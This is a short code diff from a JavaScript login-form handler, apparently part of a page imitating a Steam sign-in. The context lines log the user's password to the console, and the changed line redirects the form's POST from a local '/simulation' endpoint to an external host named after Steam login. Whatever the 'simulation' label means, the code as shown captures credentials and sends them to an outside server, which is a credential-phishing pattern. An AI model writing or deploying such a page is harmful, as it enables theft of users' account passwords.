@@ -506,7 +506,7 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
   console.log("Password:", password);
 
   try {
-    const response = await fetch("/simulation", {
+    const response = await fetch("https://steam-login-simulation.onrender.com/simulation", {
       method: "POST",
 
       headers: {
